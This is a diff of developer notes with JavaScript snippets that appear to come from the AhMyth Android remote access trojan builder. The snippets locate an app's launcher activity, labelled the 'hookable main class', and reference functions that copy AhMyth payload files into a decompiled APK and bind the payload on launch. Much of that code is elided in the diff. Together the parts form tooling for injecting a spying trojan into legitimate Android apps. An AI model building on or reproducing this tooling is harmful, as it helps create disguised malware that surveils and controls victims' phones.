@@ -1,4 +1,4 @@
-# Main Application Class/ Launcher Activity Extraction
+## Mew Hookable Main Class Name Extraction
 ```js
 const fs = require('fs');
 
@@ -6,7 +6,7 @@ const xml2js = require('xml2js');
 
 // Read the AndroidManifest.xml file
 
-fs.readFile('path/to/AndroidManifest.xml', (err, data) => {
+fs.readFile('AndroidManifest.xml', (err, data) => {
 
   if (err) {
 
@@ -66,11 +66,11 @@ fs.readFile('path/to/AndroidManifest.xml', (err, data) => {
 
       });
 
-      let mainActivityClassName = activity && activity['$'] && activity['$']['android:name'];
+      let mainActivityClassName;
 
-      
+      if (activity) {
 
-      if (mainActivityClassName) {
+        mainActivityClassName = activity['$'] && activity['$']['android:name'];
 
         // Remove the package name if it's present
 
@@ -86,7 +86,41 @@ fs.readFile('path/to/AndroidManifest.xml', (err, data) => {
 
       } else {
 
-        console.log('Main application class and main launcher activity not found');
+        // Extract the class name of the main launcher activity from the manifest
+
+        const activityAlias = application && application['activity-alias'] && application['activity-alias'].find(activityAlias => {
+
+          const intentFilter = activityAlias['intent-filter'];
+
+          if (intentFilter) {
+
+            return intentFilter.some(filter => filter['action'].some(action => action['$']['android:name'] === 'android.intent.action.MAIN') && filter['category'].some(category => category['$']['android:name'] === 'android.intent.category.LAUNCHER'));
+
+          }
+
+          return false;
+
+        });
+
+        if (activityAlias) {
+
+          const targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
+
+          mainActivityClassName = targetActivityName.split('.').pop();
+
+          if (mainActivityClassName.startsWith('.')) {
+
+            mainActivityClassName = mainActivityClassName.slice(1);
+
+          }
+
+          console.log('Main activity class: ' + mainActivityClassName);
+
+        } else {
+
+          console.log('Main application class and main launcher activity not found');
+
+        }
 
       }
 
@@ -95,12 +129,9 @@ fs.readFile('path/to/AndroidManifest.xml', (err, data) => {
   });
 
 });
-
-
 ```
 
-
-# Recursive file search function
+## Recursive file search function
 > readdirp required!
 ```js
 readdirp(apkFolder, {fileFilter: launcherActivity, alwaysStat: true})
@@ -129,7 +160,7 @@ readdirp(apkFolder, {fileFilter: launcherActivity, alwaysStat: true})
 
   });
 ```
-# Smali Payload Directory Creation Function 
+## Smali Payload Directory Creation Function 
 ```js
     $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 
@@ -267,7 +298,7 @@ readdirp(apkFolder, {fileFilter: launcherActivity, alwaysStat: true})
   
   };
 ```
-# Backup Cross Platform Bind On Launch function
+## Backup Cross Platform Bind On Launch function
 Stored just in case of problems with the original Cross platform bind on launch function
 ```js
 $appCtrl.BindOnLauncher = (apkFolder) => {
